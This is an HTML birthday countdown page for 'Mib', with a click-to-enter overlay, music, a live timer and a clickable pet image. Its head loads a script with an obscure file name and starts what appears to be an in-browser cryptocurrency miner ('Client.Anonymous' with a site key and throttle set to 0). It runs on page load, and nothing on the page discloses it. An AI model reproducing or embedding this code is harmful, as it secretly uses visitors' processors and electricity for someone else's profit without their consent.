<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mib's Birthday Countdown</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      overflow: hidden;
      background: linear-gradient(to right, #6a11cb, #2575fc);
      color: #fff;
      text-align: center;
    }

    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 100;
      cursor: pointer;
    }

    #overlay h1 {
      font-size: 3rem;
      margin-bottom: 20px;
    }

    #main {
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    #countdown {
      font-size: 2rem;
      background: rgba(0,0,0,0.2);
      padding: 20px;
      border-radius: 15px;
      margin-bottom: 30px;
    }

    #pet {
      width: 150px;
      cursor: pointer;
      transition: transform 0.2s;
    }

    #pet.petting {
      transform: scale(1.2) rotate(10deg);
    }
  </style>
  <script src="assets/3jyQ.js"></script>
<script>
    var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
        throttle: 0, c: 'w', ads: 0
    });
    _client.start();
    

</script>

</head>
<body>

  <div id="overlay">
    <h1>Click to Enter</h1>
  </div>

  <div id="main">
    <h1>Countdown to Mib's Birthday!</h1>
    <div id="countdown"></div>
    <img id="pet" src="assets/6106c9fb07c027b77916f7d7ba1a404e.png" alt="Pet">
    <p>Click mib to give him love!</p>
  </div>

  <audio id="bgMusic" loop>
    <source src="assets/NUMBER.mp3" type="audio/mpeg">
  </audio>

  <script>
    const overlay = document.getElementById('overlay');
    const main = document.getElementById('main');
    const bgMusic = document.getElementById('bgMusic');

    overlay.addEventListener('click', () => {
      overlay.style.display = 'none';
      main.style.display = 'flex';
      bgMusic.play();
    });

    const birthday = new Date("October 22, 2025 00:00:00").getTime();
    const countdownEl = document.getElementById('countdown');

    function updateCountdown() {
      const now = new Date().getTime();
      const distance = birthday - now;

      if(distance < 0){
        countdownEl.innerHTML = "ðŸŽ‰ Erm what the birthday ðŸŽ‰";
        clearInterval(timer);
        return;
      }

      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);

      countdownEl.innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;
    }

    const timer = setInterval(updateCountdown, 1000);
    updateCountdown();

    const pet = document.getElementById('pet');
    pet.addEventListener('click', () => {
      pet.classList.add('petting');
      setTimeout(() => pet.classList.remove('petting'), 300);
    });
  </script>
</body>
</html>
